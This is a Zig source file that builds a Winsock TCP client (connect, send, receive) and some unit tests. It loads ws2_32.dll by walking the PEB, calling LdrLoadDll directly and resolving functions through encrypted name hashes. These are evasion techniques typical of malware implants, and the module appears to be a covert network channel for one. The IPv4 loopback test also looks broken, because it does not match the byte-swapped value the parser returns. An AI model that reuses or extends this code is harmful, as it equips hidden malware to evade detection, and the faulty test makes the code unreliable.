const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

pub const NetworkError = error{
    ModuleNotFound,
    FunctionNotFound,
    WsaStartupFailed,
    SocketCreateFailed,
    ConnectionFailed,
    AddressResolveFailed,
    SendFailed,
    RecvFailed,
};

const WSADATA = extern struct {
    wVersion: u16,
    wHighVersion: u16,
    szDescription: [257]u8,
    szSystemStatus: [129]u8,
    iMaxSockets: u16,
    iMaxUdpDg: u16,
    lpVendorInfo: ?*anyopaque,
};

const SOCKADDR = extern struct {
    sa_family: u16,
    sa_data: [14]u8,
};

const SOCKADDR_IN = extern struct {
    sin_family: u16,
    sin_port: u16,
    sin_addr: u32,
    sin_zero: [8]u8,
};

const AF_INET: i32 = 2;
const SOCK_STREAM: i32 = 1;
const IPPROTO_TCP: i32 = 6;
const WSA_FLAG_OVERLAPPED: u32 = 0x01;

const ADDRINFO = extern struct {
    ai_flags: i32,
    ai_family: i32,
    ai_socktype: i32,
    ai_protocol: i32,
    ai_addrlen: i32,
    ai_addr: ?*anyopaque,
    ai_canonname: ?[*:0]u8,
    ai_next: ?*ADDRINFO,
};

const Ws2Functions = struct {
    WSAStartup: *const fn (wVersionRequested: u16, lpWSAData: *WSADATA) callconv(.winapi) i32,
    WSASocketW: *const fn (af: i32, typ: i32, protocol: i32, lpProtocolInfo: ?*anyopaque, g: u32, dwFlags: u32) callconv(.winapi) types.HANDLE,
    WSAStringToAddressA: *const fn (addressString: [*:0]u8, addressFamily: i32, lpProtocolInfo: ?*anyopaque, lpAddress: *SOCKADDR, lpAddressLength: *i32) callconv(.winapi) i32,
    htons: *const fn (hostshort: u16) callconv(.winapi) u16,
    connect: *const fn (s: types.HANDLE, name: *const SOCKADDR, namelen: i32) callconv(.winapi) i32,
    send: *const fn (s: types.HANDLE, buf: [*]const u8, len: i32, flags: i32) callconv(.winapi) i32,
    recv: *const fn (s: types.HANDLE, buf: [*]u8, len: i32, flags: i32) callconv(.winapi) i32,
    closesocket: *const fn (s: types.HANDLE) callconv(.winapi) i32,
    WSACleanup: *const fn () callconv(.winapi) i32,
    getaddrinfo: ?*const fn (nodename: [*:0]const u8, servname: [*:0]const u8, hints: *const ADDRINFO, res: ?*?*ADDRINFO) callconv(.winapi) i32,
    freeaddrinfo: ?*const fn (res: *ADDRINFO) callconv(.winapi) void,
};

var g_fns: Ws2Functions = undefined;
var g_initialized = false;

fn loadModule(comptime name: []const u8) ?types.PVOID {
    const ntdll_hash = hash.encryptedHashModule("ntdll.dll");
    const ntdll = peb_walk.getModuleByHash(ntdll_hash) orelse return null;

    const ldr_load: *const fn (
        search_path: ?*u16,
        dll_characteristics: ?*u32,
        dll_name: *types.UNICODE_STRING,
        base_address: *types.PVOID,
    ) callconv(.winapi) types.NTSTATUS = @ptrCast(@alignCast(
        export_resolve.getFunctionByHash(ntdll, hash.encryptedHashFunc("LdrLoadDll")) orelse return null,
    ));

    const mod_hash = hash.encryptedHashModule(name);
    if (peb_walk.getModuleByHash(mod_hash)) |base| return base;

    var wide_buf: [name.len * 2 + 2]u8 = undefined;
    for (name, 0..) |c, i| {
        wide_buf[i * 2] = c;
        wide_buf[i * 2 + 1] = 0;
    }
    wide_buf[name.len * 2] = 0;
    wide_buf[name.len * 2 + 1] = 0;

    var unicode_str = types.UNICODE_STRING{
        .Length = @as(u16, @intCast(name.len * 2)),
        .MaximumLength = @as(u16, @intCast(name.len * 2 + 2)),
        .Buffer = @as([*]u16, @ptrCast(@alignCast(&wide_buf))),
    };

    var base: types.PVOID = undefined;
    const status = ldr_load(null, null, &unicode_str, &base);
    if (status < 0) return null;
    return base;
}

fn getFunctions() !*const Ws2Functions {
    if (g_initialized) return &g_fns;

    const base = loadModule("ws2_32.dll") orelse return error.ModuleNotFound;

    inline for (std.meta.fields(Ws2Functions)) |field| {
        const func_hash = hash.encryptedHashFunc(field.name);
        if (@typeInfo(field.type) == .optional) {
            @field(g_fns, field.name) = @ptrCast(@alignCast(export_resolve.getFunctionByHash(base, func_hash)));
        } else {
            const ptr = export_resolve.getFunctionByHash(base, func_hash) orelse return error.FunctionNotFound;
            @field(g_fns, field.name) = @ptrCast(@alignCast(ptr));
        }
    }

    g_initialized = true;
    return &g_fns;
}

pub const Socket = struct {
    initialized: bool,

    pub fn init() !Socket {
        const fns = try getFunctions();
        var wsa: WSADATA = undefined;
        const rc = fns.WSAStartup(0x0202, &wsa);
        if (rc != 0) return error.WsaStartupFailed;
        return Socket{ .initialized = true };
    }

    pub fn deinit(self: *Socket) void {
        if (!self.initialized) return;
        const fns = getFunctions() catch return;
        _ = fns.WSACleanup();
        self.initialized = false;
    }

    pub fn connect(host: []const u8, port: u16) !types.HANDLE {
        const fns = try getFunctions();

        const sock = fns.WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, null, 0, WSA_FLAG_OVERLAPPED);
        if (@intFromPtr(sock) == ~@as(usize, 0)) return error.SocketCreateFailed;

        var host_buf: [256]u8 = undefined;
        const host_slice = if (host.len < 255) host else host[0..255];
        @memcpy(host_buf[0..host_slice.len], host_slice);
        host_buf[host_slice.len] = 0;

        var addr: SOCKADDR_IN = undefined;
        var addr_len: i32 = @sizeOf(SOCKADDR_IN);
        var rc = fns.WSAStringToAddressA(
            @as([*:0]u8, @ptrCast(&host_buf)),
            AF_INET,
            null,
            @as(*SOCKADDR, @ptrCast(&addr)),
            &addr_len,
        );
        if (rc != 0) {
            addr.sin_family = @as(u16, @intCast(AF_INET));
            const parsed = parseIpv4(host);
            if (parsed) |ip| {
                addr.sin_addr = ip;
            } else if (fns.getaddrinfo) |getaddr| {
                var hints: ADDRINFO = std.mem.zeroes(ADDRINFO);
                hints.ai_family = AF_INET;
                hints.ai_socktype = SOCK_STREAM;
                hints.ai_protocol = IPPROTO_TCP;
                var res: ?*ADDRINFO = null;
                var empty_str: [1]u8 = .{0};
                if (getaddr(@as([*:0]const u8, @ptrCast(&host_buf)), @as([*:0]const u8, @ptrCast(&empty_str)), &hints, &res) == 0 and res != null) {
                    const sin = @as(*const SOCKADDR_IN, @ptrCast(@alignCast(res.?.ai_addr)));
                    addr.sin_addr = sin.sin_addr;
                    if (fns.freeaddrinfo) |free_fn| free_fn(res.?);
                } else {
                    _ = fns.closesocket(sock);
                    return error.AddressResolveFailed;
                }
            } else {
                _ = fns.closesocket(sock);
                return error.AddressResolveFailed;
            }
        }
        addr.sin_family = @as(u16, @intCast(AF_INET));
        addr.sin_port = fns.htons(port);

        rc = fns.connect(sock, @as(*const SOCKADDR, @ptrCast(&addr)), @sizeOf(SOCKADDR_IN));
        if (rc != 0) {
            _ = fns.closesocket(sock);
            return error.ConnectionFailed;
        }

        return sock;
    }

    pub fn send(sock: types.HANDLE, data: []const u8) !usize {
        const fns = try getFunctions();
        const rc = fns.send(sock, data.ptr, @as(i32, @intCast(data.len)), 0);
        if (rc < 0) return error.SendFailed;
        return @intCast(@max(rc, 0));
    }

    pub fn recv(sock: types.HANDLE, buffer: []u8) !usize {
        const fns = try getFunctions();
        const rc = fns.recv(sock, buffer.ptr, @as(i32, @intCast(buffer.len)), 0);
        if (rc < 0) return error.RecvFailed;
        return @intCast(@max(rc, 0));
    }

    pub fn close(sock: types.HANDLE) void {
        const fns = getFunctions() catch return;
        _ = fns.closesocket(sock);
    }
};

fn parseIpv4(host: []const u8) ?u32 {
    var result: u32 = 0;
    var octet: u32 = 0;
    var octets: u4 = 0;
    for (host) |c| {
        if (c == '.') {
            if (octets >= 3 or octet > 255) return null;
            result = (result << 8) | octet;
            octet = 0;
            octets += 1;
        } else if (c >= '0' and c <= '9') {
            octet = octet * 10 + @as(u32, c - '0');
            if (octet > 255) return null;
        } else {
            return null;
        }
    }
    if (octets != 3 or octet > 255) return null;
    result = (result << 8) | octet;
    return @byteSwap(result);
}

test "Ws2Functions layout" {
    try std.testing.expectEqual(@sizeOf(WSADATA), @as(usize, 2 + 2 + 257 + 129 + 2 + 2 + @sizeOf(?*anyopaque)));
}

test "parseIpv4 loopback" {
    const addr = parseIpv4("127.0.0.1");
    try std.testing.expect(addr != null);
    try std.testing.expectEqual(@as(u32, 0x7F000001), addr.?);
}

test "parseIpv4 invalid" {
    try std.testing.expect(parseIpv4("") == null);
    try std.testing.expect(parseIpv4("256.0.0.1") == null);
    try std.testing.expect(parseIpv4("abc") == null);
    try std.testing.expect(parseIpv4("1.2.3.4.5") == null);
}

test "SOCKADDR_IN size" {
    try std.testing.expectEqual(@as(usize, 16), @sizeOf(SOCKADDR_IN));
}
